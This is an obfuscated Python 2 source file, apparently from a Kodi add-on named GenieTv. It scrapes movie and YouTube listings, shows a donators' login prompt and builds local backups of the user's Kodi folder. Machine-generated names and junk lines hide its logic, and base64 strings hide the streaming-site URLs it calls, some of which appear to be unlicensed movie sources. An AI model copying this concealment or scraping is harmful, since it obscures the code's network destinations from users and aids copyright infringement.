 ooOooo000oOO ( 'Box Office' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9jYXRlZ29yeS9ib3gtb2ZmaWNlLw==' ) , 10074 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( 'Search' , '' , 10078 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 if 56 - 56: ii11ii1ii % O0 - OOOo0
def O00o0OO0 ( ) :
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o00oOOooOOo0o = 'http://imoviemax.se/?s=' + ( IIi1I1iiiii ) . replace ( ' ' , '+' )
 O0O0ooOOO = o00oOOooOOo0o . lower ( )
 oOOo0O00o ( O0O0ooOOO )
def iIiIi11 ( url ) :
 OOO = [ ]
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<li class="cat-item cat-item-.+? "><a href="(.+?)">(.+?)</a><i>(.+?)</i></li>' ) . findall ( OoOO )
 for url , OO , iiiiI in o0o :
  if OO in OOO :
   pass
  else :
   ooOooo000oOO ( OO + ' - ' + iiiiI + ' Films' , url , 10074 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
   OOO . append ( OO )
   if 62 - 62: OoooooooOO * OOOo0
def oOOOoo0O0oO ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<li>.+?<b>.+?</b>.+?<a href="(.+?)">(.+?)</a>.+?<span>(.+?)</span>' , re . DOTALL ) . findall ( OoOO )
 for url , OO , iIII1I111III in o0o :
  ooOooo000oOO ( OO + ' - Views:' + iIII1I111III , url , 10075 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
  if 20 - 20: OOooOOo . OoOoOO00 % iii11 * iIii1I11I1II1
  if 98 - 98: OOOo0 % ii11i1 * OoooooooOO
def oOOo0O00o ( url ) :
 OoiIIiIi1 = [ ]
 OoOO = ooOOO0 ( url )
 next = re . compile ( "<link rel='next' href='(.+?)' />" ) . findall ( OoOO )
 for next in next :
  ooOooo000oOO ( 'NEXT PAGE' , next , 10074 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 o0o = re . compile ( '<div class="movie">.+?<img src="(.+?)" alt="(.+?)" />.+?<a href="(.+?)"><span class="player"></span></a>' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , OO , url in o0o :
  ooOooo000oOO ( OO , url , 10075 , o0O0o0 , o0O0o0 , '' )
  OoiIIiIi1 . append ( OO )
  if 37 - 37: ii11ii1ii * Ooo0OO0oOO % i11iIiiIii % o0Oo0O0Oo00oO + ii11i1
def OOoOO0o0o0 ( img , name , url ) :
 img = img
 name = name
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<div id="(.+?)" class="player-content"><iframe class="playerframe" src="(.+?)" scrolling="no".+?</iframe></div>' ) . findall ( OoOO )
 for ii1I1 , url in o0o :
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>> before' + url
  OooooOOoo0 = ( url ) . replace ( 'player' , 'watch' ) + '&fv=&sou='
  print '<<<<<<<<<<<<<<<<<<<<<<<<<<< after' + OooooOOoo0
  i1I1IiiIi1i = ( ii1I1 ) . replace ( 'play-' , 'Server ' )
  Ii1iIiII1ii1 ( i1I1IiiIi1i , OooooOOoo0 , 10076 , img , img , '' )
  if 29 - 29: OOOo0 % OOOo0
def Oo0O0 ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<source src="(.+?)" type="video/mp4">' ) . findall ( OoOO )
 for Ooo0OOoOoO0 in o0o :
  if '=m' in Ooo0OOoOoO0 :
   oOo0OOoO0 ( Ooo0OOoOoO0 )
  elif 'php' in Ooo0OOoOoO0 :
   Oo0O0 ( url )
  else :
   OoOO = ooOOO0 ( Ooo0OOoOoO0 )
   o0o = re . compile ( 'content="(.+?)">' ) . findall ( OoOO )
   for IIo0Oo0oO0oOO00 in o0o :
    oOo0OOoO0 ( Ooo0OOoOoO0 )
    if 92 - 92: OoooooooOO * O0o0Ooo
    if 100 - 100: O0o0Ooo + O0o0Ooo * OoO0O0
    if 1 - 1: o0Oo0O0Oo00oO . o0Oo0O0Oo00oO / I1IiI - O0o0Ooo
def oooO ( url ) :
 OoOO = ooOOO0 ( url )
 i1I1i111Ii = re . compile ( '<td id=".+?" class="today">.+?title="(.+?)">(.+?)</td>' , re . DOTALL ) . findall ( OoOO )
 for OOooooO0Oo , ooo in i1I1i111Ii :
  print 'there ><><><><><><><><><><><><'
  OOooooO0Oo = OOooooO0Oo
  o0o = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( ooo ) )
  for OO , iIiIIi1 in o0o :
   print 'here <><><><><><><><><><><><>'
   ooOooo000oOO ( '[COLORred]' + OOooooO0Oo + '[/COLOR] - ' + OO + ' - [COLORgreen]' + iIiIIi1 + '[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 ii = re . compile ( '<td id=".+?" class="day">.+?title="(.+?)">(.+?)</td>' , re . DOTALL ) . findall ( OoOO )
 for OOooooO0Oo , i1i1iI1iiiI in ii :
  print 'there ><><><><><><><><><><><><'
  OOooooO0Oo = OOooooO0Oo
  o0o = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( i1i1iI1iiiI ) )
  for OO , iIiIIi1 in o0o :
   print 'here <><><><><><><><><><><><>'
   ooOooo000oOO ( '[COLORred]' + OOooooO0Oo + '[/COLOR] - ' + OO + ' - [COLORgreen]' + iIiIIi1 + '[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
   if 51 - 51: OOOo0 % O0o0Ooo . OoIii111II / iIii1I11I1II1 / Ooo0OO0oOO . OoIii111II
   if 42 - 42: OOooOOo + i1IIi - ii11i1 / OoO0O0
   if 9 - 9: O0 % O0 - OOooOOo
def OoO ( url ) :
 OoOO = ooOOO0 ( url )
 ii = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( OoOO )
 for ii in ii :
  OO = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( ii ) )
  for OO in OO :
   OO = ( OO ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&' , '&' )
  url = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( ii ) )
  for url in url :
   url = 'https://www.youtube.com/w' + url
  iiI1IIIi = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( ii ) )
  for iiI1IIIi in iiI1IIIi :
   iiI1IIIi = 'http:' + iiI1IIIi
  Ii1iIiII1ii1 ( '[COLORgreen]' + OO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iiI1IIIi , '' , '' )
  if 47 - 47: Oo % Ooo0OO0oOO % i11iIiiIii - O0 + o0Oo0O0Oo00oO
  if 94 - 94: O0o0Ooo
  if 4 - 4: ii11i1 % OoIii111II * Ooo00oOo00o
  if 100 - 100: O0o0Ooo * iii11 + iii11
def OoOO0o ( url ) :
 if 1 - 1: OoOoOO00
 O0oOo00o = [ ]
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<div class="explore-list">.+?<div class="el-img"><a href="(.+?)" class=".+?"><img src="(.+?)" alt=".+?<h3>(.+?)</h3><p>(.+?)</p></div>' , re . DOTALL ) . findall ( OoOO )
 for Ooo0OOoOoO0 , o0O0o0 , OO , o0ooooO0o0O in o0o :
  OO = ( OO ) . replace ( '&#039;' , '\'' ) . replace ( '&' , '&' ) . replace ( '&quot;' , '"' )
  iiIi11iI1iii = ooOOO0 ( Ooo0OOoOoO0 )
  oo000 = re . compile ( '<!-- # player # -->.+?<iframe title=".+?".+?src="http://www.youtube.com/embed/(.+?)?autohide.+?<!-- detail box -->(.+?)</div>' , re . DOTALL ) . findall ( iiIi11iI1iii )
  for o0000oO , iI1i111I1Ii in oo000 :
   i11i1ii1I = re . compile ( '<p>(.+?)</p>' , re . DOTALL ) . findall ( str ( iI1i111I1Ii ) )
   for o0OO0o0o00o in i11i1ii1I :
    if OO in O0oOo00o :
     pass
    else :
     Ii1iIiII1ii1 ( OO , o0000oO , 8043 , o0O0o0 , o0O0o0 , o0OO0o0o00o )
     Oo0OoO00oOO0o ( 'movies' , 'INFO' )
     O0oOo00o . append ( OO )
     if 100 - 100: OoIii111II / O0o0Ooo / ii11ii1ii
     if 78 - 78: Oo - OOooOOo / I1IiI
def I11IIIi ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( iIIiiI1II1i11 )
 for url , IIii1111 , o0OO0o0o00o , I1iI , OO in o0o :
  ooOooo000oOO ( OO , url , 10065 , IIii1111 , I1iI , o0OO0o0o00o )
 Oo0OoO00oOO0o ( 'movies' , 'INFO' )
 if 38 - 38: OoIii111II % I1IiI + ii11ii1ii . i11iIiiIii
def oo0000ooooO0o ( ) :
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o00oOOooOOo0o = 'https://www.youtube.com/results?search_query=' + ( IIi1I1iiiii ) . replace ( ' ' , '+' )
 O0O0ooOOO = o00oOOooOOo0o . lower ( )
 OoOO = ooOOO0 ( O0O0ooOOO )
 o0o = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>.+?<div class="yt-lockup-description yt-ui-ellipsis yt-ui-ellipsis-2" dir="ltr">(.+?)</div>' , re . DOTALL ) . findall ( OoOO )
 next = re . compile ( '<a href="(.+?)" class="yt-uix-button.+?class="yt-uix-button-content">Next.+?</span></a>' ) . findall ( OoOO )
 for iI1i11 in next :
  iI1i11 = 'https://www.youtube.com' + iI1i11
  ooOooo000oOO ( '[COLORgreen] NEXT [/COLOR]' , iI1i11 , 10065 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 for o0O0o0 , iI1i11 , OO , OoOOoooOO0O , iI1i111I1Ii in o0o :
  Ooo . append ( OO )
  Oo0OoO00oOO0o ( 'tvshows' , 'INFO' )
  iiI1IIIi = 'http:' + ( o0O0o0 ) . replace ( 'https:' , '' )
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>' + iiI1IIIi
  iI1i11 = 'http://www.youtube.com' + iI1i11
  Ii1iIiII1ii1 ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + OO + '[/COLOR]' , ( iI1i11 ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iiI1IIIi , iiI1IIIi , iI1i111I1Ii )
 else :
  o0o = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>' , re . DOTALL ) . findall ( OoOO )
  for o0O0o0 , iI1i11 , OO , OoOOoooOO0O in o0o :
   print 'im doing it'
   Oo0OoO00oOO0o ( 'tvshows' , 'INFO' )
   iiI1IIIi = 'http:' + ( o0O0o0 ) . replace ( 'https:' , '' )
   iI1i11 = 'http://www.youtube.com' + iI1i11
   if '&' in iI1i11 :
    print ' i got here'
    OoOO = ooOOO0 ( iI1i11 )
    ii = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( OoOO )
    for ii in ii :
     OO = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( ii ) )
     for OO in OO :
      OO = ( OO ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&' , '&' )
     iI1i11 = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( ii ) )
     for iI1i11 in iI1i11 :
      iI1i11 = 'https://www.youtube.com/w' + iI1i11
     iiI1IIIi = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( ii ) )
     for iiI1IIIi in iiI1IIIi :
      iiI1IIIi = 'http:' + iiI1IIIi
     Ii1iIiII1ii1 ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + OO + '[/COLOR]' , ( iI1i11 ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iiI1IIIi , i1iiIII111ii , '' )
   elif OO in Ooo :
    pass
   elif 'user' in iI1i11 or 'elete' in OO :
    pass
   elif 'hannel' in iI1i11 :
    print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' + iI1i11
    OoOO = ooOOO0 ( iI1i11 )
    ooo00Ooo = re . compile ( 'data-thumb="(.+?)".+?href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( OoOO )
    for o0O0o0 , iI1i11 , OO in ooo00Ooo :
     if 'outube' in iI1i11 or 'list' in iI1i11 :
      pass
     elif 'atch' in iI1i11 :
      iI1i11 = ( iI1i11 ) . replace ( '/watch?v=' , '' )
      Ii1iIiII1ii1 ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + OO + '[/COLOR]' , ( iI1i11 ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , 'http:' + o0O0o0 , 'http:' + o0O0o0 , '' )
     else :
      pass
   else :
    Ii1iIiII1ii1 ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + OO + '[/COLOR]' , ( iI1i11 ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iiI1IIIi , iiI1IIIi , '' )
    if 93 - 93: i11iIiiIii - OOOo0 * ii11ii1ii * Ooo0OO0oOO % O0 + OoooooooOO
def I1i1i1 ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>.+?<div class="yt-lockup-description yt-ui-ellipsis yt-ui-ellipsis-2" dir="ltr">(.+?)</div>' , re . DOTALL ) . findall ( OoOO )
 next = re . compile ( '<a href="(.+?)" class="yt-uix-button.+?class="yt-uix-button-content">Next.+?</span></a>' ) . findall ( OoOO )
 for url in next :
  url = 'https://www.youtube.com' + url
  ooOooo000oOO ( '[COLORgreen] NEXT [/COLOR]' , url , 10065 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 for o0O0o0 , url , OO , OoOOoooOO0O , iI1i111I1Ii in o0o :
  Ooo . append ( OO )
  Oo0OoO00oOO0o ( 'tvshows' , 'INFO' )
  iiI1IIIi = 'http:' + ( o0O0o0 ) . replace ( 'https:' , '' )
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>' + iiI1IIIi
  url = 'http://www.youtube.com' + url
  Ii1iIiII1ii1 ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + OO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iiI1IIIi , iiI1IIIi , iI1i111I1Ii )
 else :
  o0o = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>' , re . DOTALL ) . findall ( OoOO )
  for o0O0o0 , url , OO , OoOOoooOO0O in o0o :
   Oo0OoO00oOO0o ( 'tvshows' , 'INFO' )
   iiI1IIIi = 'http:' + ( o0O0o0 ) . replace ( 'https:' , '' )
   url = 'http://www.youtube.com' + url
   if '&' in url :
    OoOO = ooOOO0 ( url )
    ii = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( OoOO )
    for ii in ii :
     OO = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( ii ) )
     for OO in OO :
      OO = ( OO ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&' , '&' )
     url = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( ii ) )
     for url in url :
      url = 'https://www.youtube.com/w' + url
     iiI1IIIi = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( ii ) )
     for iiI1IIIi in iiI1IIIi :
      iiI1IIIi = 'http:' + iiI1IIIi
     Ii1iIiII1ii1 ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + OO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iiI1IIIi , i1iiIII111ii , '' )
   elif OO in Ooo :
    pass
   elif 'user' in url or 'elete' in OO :
    pass
   elif 'hannel' in url :
    print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' + url
    OoOO = ooOOO0 ( url )
    ooo00Ooo = re . compile ( 'data-thumb="(.+?)".+?href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( OoOO )
    for o0O0o0 , url , OO in ooo00Ooo :
     if 'outube' in url or 'list' in url :
      pass
     elif 'atch' in url :
      url = ( url ) . replace ( '/watch?v=' , '' )
      Ii1iIiII1ii1 ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + OO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , 'http:' + o0O0o0 , 'http:' + o0O0o0 , '' )
     else :
      pass
   else :
    Ii1iIiII1ii1 ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + OO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iiI1IIIi , iiI1IIIi , '' )
    if 73 - 73: O0 * oo0OO + ii11i1 + o0Oo0O0Oo00oO
    if 40 - 40: OoOoOO00 . I1IiI * O0o0Ooo + iii11 + iii11
def I1ii1I1iiii ( ) :
 if oo0o0O00 == 'insert_password' :
  oOOoo00O0O . ok ( '[COLORgreen]Donators Login[/COLOR]' , 'You need to set username and password to access this' , 'These are unique and provided to donators to help with server and stream costs' , 'Donate @ [COLORgreen]http://architects.x10host.com[/COLOR]' )
  o0oO0 . openSettings ( sys . argv [ 0 ] )
 else :
  iiI = open ( I11II1i )
  o0o = re . compile ( 'plugin.video.GenieTv.+?2Flive%2F(.+?)%2F(.+?)%2F' ) . findall ( str ( iiI ) )
  for oOIIiIi , OOoOooOoOOOoo in o0o :
   if oOIIiIi == 'needs replacing' or OOoOooOoOOOoo == 'needs replacing' :
    Iiii1iI1i ( )
  ooOooo000oOO ( '[COLORgreen]DONATORS LIST[/COLOR]' , iiI1IiI + '/thelistnew.m3u' , 7080 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
  if 34 - 34: o0Oo0O0Oo00oO * OOOo0 . i1IIi * o0Oo0O0Oo00oO / o0Oo0O0Oo00oO
def IIiI1Ii ( ) :
 i1iiIIiiI111 . ok ( '[COLOR=white]ReCreate Addons.ini[/COLOR]' , 'If it doesnt work ensure login details are correct and retry' , '' , 'This will allow access to streams in guide without linking to favourites' )
 xbmc . executebuiltin ( "XBMC.RunScript(" + O0o0Oo + ")" )
 Iiii1iI1i ( )
 i1iiIIiiI111 . ok ( '[COLOR=yellow]Done[/COLOR]' , 'Done' , 'Easy as that' , 'Now Go to guide and it should link your GTV streams' )
 if 57 - 57: iii11 - o0Oo0O0Oo00oO - Ooo0OO0oOO + Ooo00oOo00o
def I1IIIiI11i1 ( ) :
 try :
  i11I1I1I = gui . TVGuide ( )
  i11I1I1I . doModal ( )
  del i11I1I1I
  if 64 - 64: ii11i1
 except :
  import sys
  import traceback as tb
  ( oo00O00Oo , IIIII1II , traceback ) = sys . exc_info ( )
  tb . print_exception ( oo00O00Oo , IIIII1II , traceback )
  if 35 - 35: iIii1I11I1II1
def I1i ( ) :
 ooOooo000oOO ( 'Full Backup' , '' , 10061 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your Full System' )
 if os . path . exists ( OOOO ) :
  ooOooo000oOO ( 'Backup Genie Favourites' , iI1i11 , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your favourites' )
 if os . path . exists ( I1IIIii ) :
  ooOooo000oOO ( 'Backup Ivue Config' , I1IIIii , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your master.db' )
 if os . path . exists ( oOoOooOo0o0 ) :
  ooOooo000oOO ( 'Backup Kodi Favourites' , oOoOooOo0o0 , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your favourites.xml' )
  if 32 - 32: I1IiI / Ooo00oOo00o + iii11
  if 32 - 32: iIii1I11I1II1 % oo0OO
  if 65 - 65: o0Oo0O0Oo00oO . OoooooooOO / ii11ii1ii . i1IIi * Ooo00oOo00o
zip = o0oO0 . getSetting ( 'zip' )
IiIiII1 = xbmc . translatePath ( os . path . join ( zip ) )
def Iii1iiIi1II ( ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if not os . path . exists ( zip ) :
  i1iiIIiiI111 . ok ( '[COLOR=white]Origin[/COLOR]' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' , '' , '' )
  o0oO0 . openSettings ( sys . argv [ 0 ] )
  if 14 - 14: OOOo0
  if 19 - 19: Ooo00oOo00o - Oo . OoIii111II / OoIii111II % o0Oo0O0Oo00oO
  if 56 - 56: OOOo0 . O0 + Oo
def i1II1I1Iii1 ( name , url , description ) :
 if 'Backup' in name :
  if 'Genie' in name :
   url = OOOO
  elif 'Ivue' in name :
   url = I1IIIii
  elif 'Kodi' in name :
   url = oOoOooOo0o0
  Iii1iiIi1II ( )
  iiI11Iii = open ( url ) . read ( )
  O0o0O0 = os . path . join ( IiIiII1 , description . split ( 'Your ' ) [ 1 ] )
  Ii1II1I11i1 = open ( O0o0O0 , mode = 'w' )
  Ii1II1I11i1 . write ( iiI11Iii )
  Ii1II1I11i1 . close ( )
 else :
  if 'guisettings.xml' in description :
   oOoooooOoO = open ( os . path . join ( IiIiII1 , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   Ii111 = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % skin
   o0o = re . compile ( Ii111 ) . findall ( oOoooooOoO )
   for type , I111i1i1111 , IIII1 in o0o :
    IIII1 = IIII1 . replace ( '&quot;' , '' ) . replace ( '&' , '&' )
    xbmc . executebuiltin ( "Skin.Se	t%s(%s,%s)" % ( type . title ( ) , I111i1i1111 , IIII1 ) )
  else :
   O0o0O0 = os . path . join ( url )
   iiI11Iii = open ( os . path . join ( IiIiII1 , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   Ii1II1I11i1 = open ( O0o0O0 , mode = 'w' )
   Ii1II1I11i1 . write ( iiI11Iii )
   Ii1II1I11i1 . close ( )
 i1iiIIiiI111 . ok ( "[COLOR=white]Origin[/COLOR]" , "" , 'All Done !' , '' )
 if 10 - 10: O0o0Ooo / o0Oo0O0Oo00oO + i11iIiiIii / ii11i1
 if 74 - 74: iii11 + O0 + i1IIi - i1IIi + OoOoOO00
 if 83 - 83: ii11ii1ii - OOOo0 + iii11
 if 5 - 5: ii11i1
def iIi1i1iIi1iI ( ) :
 iiIi1iI1iIii = 1
 Iii1iiIi1II ( )
 o00OooO0oo = xbmc . translatePath ( os . path . join ( IiIiII1 , 'Build Backup' , 'Full Backup' , '' ) )
 o0o0oOoOO0O = xbmc . translatePath ( os . path . join ( IiIiII1 , 'Build Backup' , 'my_full_backup.zip' ) )
 i1ii1II1ii = xbmc . translatePath ( os . path . join ( IiIiII1 , 'Build Backup' , 'my_full_backup_GUI_Settings.zip' ) )
 if not os . path . exists ( o00OooO0oo ) :
  os . makedirs ( o00OooO0oo )
 iII111Ii = oOOoo00O0O . input ( 'Enter a name for this backup' , type = xbmcgui . INPUT_ALPHANUM )
 if ( not iII111Ii ) : return False , 0
 Ooo00OoOOO = iII111Ii
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( o00OooO0oo , Ooo00OoOOO + '.zip' ) )
 IIII1iII = [ 'plugin.video.GenieTv' ]
 ii1III11 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
 I1iiIIIi11 = [ 'plugin.video.GenieTv' , 'repository.origin' , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 Ii1I11ii1i = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' ]
 O0iIiIIIIIii = "Creating full backup of existing build"
 OOo0 = "Creating Community Build"
 ii11I1 = "Archiving..."
 oO0oo = ""
 Ii111iIi1iIi = "Please Wait"
 IIIIIo0ooOoO000oO ( oooOOOOO , Oo0OO0000oooo , OOo0 , ii11I1 , oO0oo , Ii111iIi1iIi , I1iiIIIi11 , Ii1I11ii1i )
 time . sleep ( 1 )
 OOo = xbmc . translatePath ( os . path . join ( o00OooO0oo , Ooo00OoOOO + '_guisettings.zip' ) )
 i1i11I1I1iii1 = zipfile . ZipFile ( OOo , mode = 'w' )
 try :
  i1i11I1I1iii1 . write ( xbmc . translatePath ( os . path . join ( oooOOOOO , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except : pass
 i1i11I1I1iii1 . close ( )
 if iiIi1iI1iIii == 0 :
  i1iiIIiiI111 . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your' , 'system, please reboot and try again.' , '' )
 else :
  i1iiIIiiI111 . ok ( "SUCCESS!" , 'You Are Now Backed Up. If you\'d like to share this build with' , 'the community please post details on the forum at' , '[COLOR=blue][B]http://rh-project.info[/COLOR][/B]' )
  i1iiIIiiI111 . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=yellow]' + o0o0oOoOO0O , '[/COLOR]Universal Backup (can be used on any device): [COLOR=yellow]' + Oo0OO0000oooo + '[/COLOR]' )
  if 8 - 8: o0Oo0O0Oo00oO + OoOoOO00 / oo0OO / Ooo0OO0oOO
def IIIIIo0ooOoO000oO ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 ooo0O = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 iII1iii = len ( sourcefile )
 i11i1iiiII = [ ]
 ooOO0oO0oo00o = [ ]
 Oo0oO0ooo . create ( message_header , message1 , message2 , message3 )
 for oOOo0oo0O , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( sourcefile ) :
  for file in i1iIiiiiii1II :
   ooOO0oO0oo00o . append ( file )
 O0OOO0OOooo00 = len ( ooOO0oO0oo00o )
 for oOOo0oo0O , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( sourcefile ) :
  IiiIiI1Ii1i [ : ] = [ I111iIi1 for I111iIi1 in IiiIiI1Ii1i if I111iIi1 not in exclude_dirs ]
  i1iIiiiiii1II [ : ] = [ Ii1II1I11i1 for Ii1II1I11i1 in i1iIiiiiii1II if Ii1II1I11i1 not in exclude_files ]
  for file in i1iIiiiiii1II :
   i11i1iiiII . append ( file )
   oo00O00oO000o = len ( i11i1iiiII ) / float ( O0OOO0OOooo00 ) * 100
   Oo0oO0ooo . update ( int ( oo00O00oO000o ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   OOo00OoO = os . path . join ( oOOo0oo0O , file )
   if not 'temp' in IiiIiI1Ii1i :
    if not 'plugin.program.originwizard' in IiiIiI1Ii1i :
     import time
     iIi1 = '01/01/1980'
     i11iiI1111 = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( OOo00OoO ) ) )
     if i11iiI1111 > iIi1 :
      ooo0O . write ( OOo00OoO , OOo00OoO [ iII1iii : ] )
 ooo0O . close ( )
 Oo0oO0ooo . close ( )
 if 97 - 97: Oo * OOOo0 . iIii1I11I1II1
 if 16 - 16: o0Oo0O0Oo00oO % OoooooooOO - iii11 * ii11i1 * ii11ii1ii / OoooooooOO
def I11o0oO00oO0o0o0 ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]SCOOBY STREAMS[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvdHZjYXRzLnBocA==' ) ) , 1016 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]SCOOBY SCRAPES[/COLOR]' , iiI1IiI , 1024 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
